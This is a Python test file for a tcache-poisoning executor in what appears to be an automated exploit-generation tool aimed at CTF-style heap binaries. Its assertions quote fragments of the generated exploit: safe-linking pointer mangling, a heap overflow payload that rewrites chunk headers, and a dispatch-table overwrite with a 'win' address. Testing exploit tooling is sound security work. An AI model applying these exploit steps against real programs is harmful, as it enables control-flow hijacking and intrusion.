"""Focused tests for the overflow-driven path in tcache_poison_got."""

from pathlib import Path
from types import SimpleNamespace

from supwngo.core.binary import Symbol
from supwngo.exploit.pipeline.executors.heap_techniques import TcachePoisonGotExecutor


def _binary():
    return SimpleNamespace(
        path=Path("/tmp/heap_overflow_tcache_poison"),
        bits=64,
        symbols={
            "dispatch_table": Symbol(
                name="dispatch_table", address=0x404090, size=32,
                type="OBJECT", binding="GLOBAL", section=".data",
            ),
        },
    )


def _menu():
    return {"create": 1, "edit": 2, "delete": 3, "invoke": 4}


def test_overflow_target_requires_the_aligned_dispatch_table_and_invoke_role():
    binary = _binary()
    executor = TcachePoisonGotExecutor()

    assert executor._overflow_target(binary, _menu()) == (
        "dispatch_table", 0x404090,
    )
    assert executor._overflow_target(binary, {"create": 1}) is None


def test_overflow_script_preserves_the_measured_layout_and_two_free_count():
    executor = TcachePoisonGotExecutor()
    context = SimpleNamespace(binary=_binary())
    script = executor._overflow_script(
        context, _menu(), "dispatch_table", 0x404090, "win", 0x401358, True,
    )

    first_free = script.index('menu_cmd(delete_opt, b"2\\n")')
    second_free = script.index('menu_cmd(delete_opt, b"1\\n")')
    poison = script.index("poisoned = (chunk1 >> 12) ^ dispatch_table")
    overflow = script.index(
        'overflow = b"A" * 0x50 + p64(0) + p64(0x61) + p64(poisoned)'
    )

    assert first_free < second_free < poison < overflow
    assert "if len(overflow) != 0x68:" in script
    assert "stride = 0x60" in script


def test_overflow_script_checks_the_poison_oracle_before_hijacking():
    executor = TcachePoisonGotExecutor()
    context = SimpleNamespace(binary=_binary())
    script = executor._overflow_script(
        context, _menu(), "dispatch_table", 0x404090, "win", 0x401358, True,
    )

    oracle = script.index("if landed != dispatch_table:")
    hijack = script.index("fill(2, p64(win_addr))")
    trigger = script.index('menu_cmd(invoke_opt, b"0\\n")')

    assert oracle < hijack < trigger
    assert "landed_reply = create(2)" in script
    assert "create(1)" in script
